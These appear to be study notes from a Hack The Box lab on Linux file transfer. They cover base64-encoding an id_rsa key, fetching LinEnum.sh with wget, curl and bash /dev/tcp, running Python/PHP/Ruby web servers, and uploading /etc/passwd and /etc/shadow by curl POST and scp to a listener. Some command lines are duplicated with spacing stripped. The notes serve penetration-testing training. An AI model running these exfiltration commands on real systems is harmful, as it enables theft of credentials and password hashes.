# Base64 Encoding/Decoding (depends on file size)
 
```
burray@htb
[/htb]
$
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa

burray@htb
[/htb]
$
cat
id_rsa 
|
base64 -w 
0
;
echo


burray@htb
[/htb]
$
echo
-n 
'{STRING}'
|
base64 -d 
>
id_rsa


burray@htb
[/htb]
$
wget {URL} -O /tmp/LinEnum.sh

burray@htb
[/htb]
$
curl
-o /tmp/LinEnum.sh {URL}


burray@htb
[/htb]
$
exec
3
<>/dev/tcp/10.10.10.32/80


burray@htb
[/htb]
$
echo
-e 
"GET /LinEnum.sh HTTP/1.1
\n\n
"
>
&3


burray@htb
[/htb]
$
cat
<&3
￼

burray@htb
[/htb]
$
mkdir
https 
&&
cd
https

burray@htb
[/htb]
$
sudo
python3 -m uploadserver 
443
--server-certificate /root/server.pem
burray@htb
[/htb]
$
curl
-X POST 
https://192.168.49.128/upload
 -F 
'files=@/etc/passwd'
-F 
'files=@/etc/shadow'
--insecure
burray@htb
[/htb]
$
python3 -m http.server
burray@htb
[/htb]
$
python2.7 -m SimpleHTTPServer
burray@htb
[/htb]
$
php -S 
0.0
.0.0:8000
burray@htb
[/htb]
$
ruby -run -ehttpd 
.
-p8000

burray@htb
[/htb]
$
wget192.168
.49.128:8000/filetotransfer.txt
burray@htb
[/htb]
$
scp
/etc/passwd plaintext@192.168.49.128:/home/plaintext/


```

[/htb]$md5sum id_rsa
 
4e301756a07ded0a2dd6953abf015278 id_rsa
 
burray@htb[/htb]$catid_rsa |base64 -w 0;echo
 
We can then use -d on linux to decode it.
 
burray@htb[/htb]$echo-n '{STRING}'|base64 -d >id_rsa
 
# Web Downloads
 
burray@htb[/htb]$wget {URL} -O /tmp/LinEnum.sh
 
burray@htb[/htb]$curl-o /tmp/LinEnum.sh {URL}
 
# Download with Bash

==Connect to the Target Webserver==  
burray@htb[/htb]$exec3<>/dev/tcp/10.10.10.32/80  
==HTTP GET Request==  
burray@htb[/htb]$echo-e "GET /LinEnum.sh HTTP/1.1\n\n">&3  
==Print the Response==  
burray@htb[/htb]$cat<&3￼
 
# SSH Downloads

1. Enable SSH Server
2. sudo systemctl enable ssh
3. Start SSH Server
4. sudo systemctl start ssh
5. Check for SSH Listening Port
6. netstat -lnpt
7. Download
8. scp plaintext@192.168.49.128:/root/myroot.txt .

# Upload Operations

## Web Upload

We'll use uploadserver, an extended tool from Python's HTTP.Server module.

1. Pwnbox - Start Web Server
2. burray@htb[/htb]$ sudo python3 -m pip install --user uploadserver
3. Create a self-signed cert
4. burray@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
5. Start Web Server

burray@htb[/htb]$mkdirhttps &&cdhttps  
burray@htb[/htb]$sudopython3 -m uploadserver 443--server-certificate /root/server.pem

7. Upload Multiple Files

burray@htb[/htb]$curl-X POST [https://192.168.49.128/upload](https://192.168.49.128/upload) -F 'files=@/etc/passwd'-F 'files=@/etc/shadow'--insecure

9. the --insecure is for the self-signed cert

# Alternative Web File Transfers

1. Python3

burray@htb[/htb]$python3 -m http.server

3. Python2.7

burray@htb[/htb]$python2.7 -m SimpleHTTPServer

5. PHP

burray@htb[/htb]$php -S 0.0.0.0:8000

7. Ruby

burray@htb[/htb]$ruby -run -ehttpd .-p8000
 
1. Download the File from the TARGET to Pwnbox

burray@htb[/htb]$wget192.168.49.128:8000/filetotransfer.txt

# SCP Upload

1. File Upload

burray@htb[/htb]$scp/etc/passwd plaintext@192.168.49.128:/home/plaintext/